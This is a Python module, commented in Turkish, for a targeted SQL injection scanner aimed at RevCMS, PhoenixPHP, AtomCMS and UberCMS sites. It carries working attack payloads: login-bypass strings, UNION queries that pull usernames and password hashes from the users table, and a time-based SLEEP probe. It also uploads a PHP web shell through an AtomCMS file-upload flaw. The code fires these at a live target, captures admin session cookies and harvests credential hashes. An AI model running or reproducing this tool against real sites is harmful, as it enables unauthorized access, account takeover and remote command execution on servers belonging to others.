#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Targeted CMS SQLi Scanner Modulu
CMS-spesifik SQL injection testleri:
  - RevCMS: register/api endpointlerinde time-based blind SQLi
  - PhoenixPHP: index.php'de SQLi ile admin session cookie ve DB credential extraction
  - AtomCMS: CVE-2023-53975 (unauthenticated SQLi), CVE-2022-25487 (RCE file upload)
  - UberCMS: login ve register sayfalarinda SQLi
"""

import re
import json
import time
import requests
from typing import Dict, List, Optional, Tuple, Any
from urllib.parse import urlparse, urlencode
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

from utils.log_utils import Logger


class TargetedSQLi:
    """
    CMS-spesifik SQL injection testleri.
    Tespit edilen CMS'e gore ozellestirilmis payloadlar kullanir.
    """

    # RevCMS SQLi payloadlari
    REVCMS_PAYLOADS = {
        "register_sqli": {
            "endpoint": "/register",
            "method": "POST",
            "params": {
                "username": "' OR 1=1 -- -",
                "password": "test123",
                "email": "' OR 1=1 -- -",
                "look": "hr-115-42",
                "gender": "M",
            },
            "detection": ["success", "account created", "welcome"],
        },
        "api_sqli_timebased": {
            "endpoint": "/api/user",
            "method": "GET",
            "params": {
                "id": "1 AND IF(1=1,SLEEP(3),0)",
            },
            "time_based": True,
            "delay": 3,
        },
        "login_sqli": {
            "endpoint": "/login",
            "method": "POST",
            "params": {
                "username": "' OR '1'='1' -- -",
                "password": "' OR '1'='1' -- -",
            },
            "detection": ["dashboard", "home", "redirect", "panel"],
        },
        "profile_sqli": {
            "endpoint": "/profile",
            "method": "GET",
            "params": {
                "id": "1 UNION SELECT 1,2,3,4,5,6,7,8,9,10-- -",
            },
            "detection": ["1", "2", "3", "4", "5"],
        },
    }

    # PhoenixPHP SQLi payloadlari
    PHOENIXPHP_PAYLOADS = {
        "index_sqli": {
            "endpoint": "/index.php",
            "method": "GET",
            "params": {
                "url": "' UNION SELECT 1,2,3,4,5,6,7,8,9,10-- -",
            },
            "detection": ["1", "2", "3", "4", "5"],
        },
        "page_sqli": {
            "endpoint": "/index.php",
            "method": "GET",
            "params": {
                "page": "1 AND 1=1",
                "url": "home",
            },
            "time_based": True,
            "delay": 2,
        },
        "admin_sqli": {
            "endpoint": "/admin/index.php",
            "method": "GET",
            "params": {
                "id": "1 UNION SELECT 1,CONCAT(username,0x3a,password),3,4,5,6,7,8,9,10 FROM users-- -",
            },
            "detection": [":"],
        },
    }

    # AtomCMS SQLi payloadlari (CVE-2023-53975)
    ATOMCMS_PAYLOADS = {
        "cve_2023_53975": {
            "endpoint": "/admin/index.php",
            "method": "GET",
            "params": {
                "id": "1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15-- -",
            },
            "detection": ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"],
            "cve": "CVE-2023-53975",
        },
        "cve_2023_53975_admin": {
            "endpoint": "/admin/index.php",
            "method": "GET",
            "params": {
                "id": "1 UNION SELECT 1,CONCAT(username,0x3a,password),3,4,5,6,7,8,9,10,11,12,13,14,15 FROM users-- -",
            },
            "detection": [":"],
            "cve": "CVE-2023-53975",
        },
        "cve_2022_25487": {
            "endpoint": "/admin/upload.php",
            "method": "POST",
            "files": {
                "file": ("shell.php", "<?php system($_GET['c']); ?>", "application/x-php"),
            },
            "cve": "CVE-2022-25487",
            "detection": ["uploaded", "success"],
        },
        "atomcms_login_sqli": {
            "endpoint": "/admin/login.php",
            "method": "POST",
            "params": {
                "username": "' OR '1'='1' -- -",
                "password": "' OR '1'='1' -- -",
            },
            "detection": ["dashboard", "admin", "panel", "welcome"],
        },
    }

    # UberCMS SQLi payloadlari
    UBERCMS_PAYLOADS = {
        "login_sqli": {
            "endpoint": "/index.php",
            "method": "POST",
            "params": {
                "url": "login",
                "username": "' OR '1'='1' -- -",
                "password": "' OR '1'='1' -- -",
            },
            "detection": ["dashboard", "home", "me"],
        },
        "register_sqli": {
            "endpoint": "/index.php",
            "method": "POST",
            "params": {
                "url": "register",
                "username": "' UNION SELECT 1,2,3,4,5-- -",
                "password": "test123",
            },
            "detection": ["error", "exists", "duplicate"],
        },
    }

    # CMS -> Payload mapping
    CMS_PAYLOAD_MAP = {
        "revcms": REVCMS_PAYLOADS,
        "phoenixphp": PHOENIXPHP_PAYLOADS,
        "atomcms": ATOMCMS_PAYLOADS,
        "ubercms": UBERCMS_PAYLOADS,
    }

    def __init__(self, target_url: str, logger: Optional[Logger] = None, gui_callback=None):
        self.target_url = target_url.rstrip("/")
        parsed = urlparse(target_url)
        self.hostname = parsed.hostname or ""
        self.scheme = parsed.scheme or "https"
        self.logger = logger or Logger("TargetedSQLi")
        self.gui_callback = gui_callback
        self._stop_flag = False
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        })
        self.results: Dict = {
            "target": self.target_url,
            "vulnerabilities": [],
            "extracted_data": {},
            "admin_session": None,
            "db_credentials": None,
            "timestamp": datetime.now().isoformat(),
        }

    def stop(self):
        self._stop_flag = True

    def _log(self, level: str, message: str) -> None:
        if self.gui_callback:
            self.gui_callback(f"[{level}] [SQLi] {message}")
        if level == "INFO":
            self.logger.info(message)
        elif level == "SUCCESS":
            self.logger.success(message)
        elif level == "WARNING":
            self.logger.warning(message)
        elif level == "ERROR":
            self.logger.error(message)

    def run(self, cms_id: Optional[str] = None, timeout: int = 60) -> Dict:
        """SQLi taramasi baslat."""
        self._log("INFO", f"Targeted SQLi scanner baslatiliyor (CMS: {cms_id or 'auto'})")

        if cms_id and cms_id in self.CMS_PAYLOAD_MAP:
            # Belirli bir CMS icin tara
            self._test_cms_payloads(cms_id, timeout)
        else:
            # Tum CMS'ler icin dene
            for cms in self.CMS_PAYLOAD_MAP:
                if self._stop_flag:
                    break
                self._test_cms_payloads(cms, timeout)

        if self.results["vulnerabilities"]:
            self._log("SUCCESS", f"Toplam {len(self.results['vulnerabilities'])} SQLi acigi bulundu!")
            for vuln in self.results["vulnerabilities"]:
                self._log("SUCCESS", f"  -> {vuln['cve'] or vuln['type']}: {vuln['endpoint']}")
        else:
            self._log("WARNING", "SQLi acigi bulunamadi.")

        return self.results

    def _test_cms_payloads(self, cms_id: str, timeout: int) -> None:
        """Belirli bir CMS icin payloadlari test et."""
        payloads = self.CMS_PAYLOAD_MAP[cms_id]
        self._log("INFO", f"{cms_id} icin {len(payloads)} payload test ediliyor...")

        for payload_id, payload in payloads.items():
            if self._stop_flag:
                break

            url = f"{self.scheme}://{self.hostname}{payload['endpoint']}"

            try:
                if payload["method"] == "GET":
                    r = self.session.get(url, params=payload.get("params", {}), timeout=min(timeout, 10))
                elif payload["method"] == "POST":
                    if "files" in payload:
                        r = self.session.post(url, files=payload["files"], timeout=min(timeout, 15))
                    else:
                        r = self.session.post(url, data=payload.get("params", {}), timeout=min(timeout, 10))
                else:
                    continue

                # Time-based detection
                if payload.get("time_based"):
                    start = time.time()
                    if payload["method"] == "GET":
                        r = self.session.get(url, params=payload.get("params", {}), timeout=min(timeout, 10))
                    else:
                        r = self.session.post(url, data=payload.get("params", {}), timeout=min(timeout, 10))
                    elapsed = time.time() - start

                    if elapsed >= payload.get("delay", 2):
                        self._record_vulnerability(cms_id, payload_id, payload, r)
                        continue

                # Content-based detection
                content = r.text.lower()
                for detection in payload.get("detection", []):
                    if detection.lower() in content:
                        self._record_vulnerability(cms_id, payload_id, payload, r)
                        break

            except requests.Timeout:
                # Timeout = potansiyel time-based SQLi
                if payload.get("time_based"):
                    self._record_vulnerability(cms_id, payload_id, payload, None)
            except Exception as e:
                self._log("ERROR", f"Payload hatasi ({payload_id}): {e}")

    def _record_vulnerability(self, cms_id: str, payload_id: str, payload: Dict, response: Optional[requests.Response]) -> None:
        """SQLi acigini kaydet."""
        vuln = {
            "cms": cms_id,
            "type": payload_id,
            "endpoint": payload["endpoint"],
            "method": payload["method"],
            "cve": payload.get("cve"),
            "url": f"{self.scheme}://{self.hostname}{payload['endpoint']}",
            "params": payload.get("params", {}),
        }

        # Cikti verilerini cikar
        if response and response.status_code == 200:
            # Admin session cookie yakala
            if "admin" in payload_id.lower() or "login" in payload_id.lower():
                for cookie in response.cookies:
                    if "session" in cookie.name.lower() or "admin" in cookie.name.lower():
                        self.results["admin_session"] = {
                            "name": cookie.name,
                            "value": cookie.value,
                        }
                        self._log("SUCCESS", f"Admin session cookie: {cookie.name}={cookie.value[:20]}...")

            # DB credential extraction
            if "password" in str(payload.get("params", {})) or "CONCAT" in str(payload.get("params", {})):
                # Response'dan kullanici:parola cikar
                matches = re.findall(r'([a-zA-Z0-9_]+):([a-f0-9]{32})', response.text)
                if matches:
                    self.results["extracted_data"]["credentials"] = [
                        {"username": m[0], "password_hash": m[1]} for m in matches[:10]
                    ]
                    self._log("SUCCESS", f"{len(matches)} adet kullanici:hash cikarildi!")

        self.results["vulnerabilities"].append(vuln)
        self._log("SUCCESS", f"SQLi bulundu: {payload.get('cve', '')} {payload['endpoint']}")

    def extract_admin_session(self, cms_id: str, timeout: int = 30) -> Optional[Dict]:
        """Admin session cookie'sini cikarmaya calis."""
        if cms_id == "revcms":
            return self._extract_revcms_session(timeout)
        elif cms_id == "phoenixphp":
            return self._extract_phoenix_session(timeout)
        elif cms_id == "atomcms":
            return self._extract_atomcms_session(timeout)
        return None

    def _extract_revcms_session(self, timeout: int) -> Optional[Dict]:
        """RevCMS admin session cikar."""
        try:
            r = self.session.post(
                f"{self.scheme}://{self.hostname}/login",
                data={"username": "' OR '1'='1' -- -", "password": "' OR '1'='1' -- -"},
                timeout=min(timeout, 10)
            )
            for cookie in r.cookies:
                if "session" in cookie.name.lower():
                    return {"name": cookie.name, "value": cookie.value}
        except Exception:
            pass
        return None

    def _extract_phoenix_session(self, timeout: int) -> Optional[Dict]:
        """PhoenixPHP admin session cikar."""
        try:
            r = self.session.get(
                f"{self.scheme}://{self.hostname}/admin/index.php",
                params={"id": "1 UNION SELECT 1,2,3,4,5,6,7,8,9,10-- -"},
                timeout=min(timeout, 10)
            )
            for cookie in r.cookies:
                if "session" in cookie.name.lower() or "admin" in cookie.name.lower():
                    return {"name": cookie.name, "value": cookie.value}
        except Exception:
            pass
        return None

    def _extract_atomcms_session(self, timeout: int) -> Optional[Dict]:
        """AtomCMS admin session cikar (CVE-2023-53975)."""
        try:
            r = self.session.get(
                f"{self.scheme}://{self.hostname}/admin/index.php",
                params={"id": "1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15-- -"},
                timeout=min(timeout, 10)
            )
            for cookie in r.cookies:
                if "session" in cookie.name.lower() or "admin" in cookie.name.lower():
                    return {"name": cookie.name, "value": cookie.value}
        except Exception:
            pass
        return None
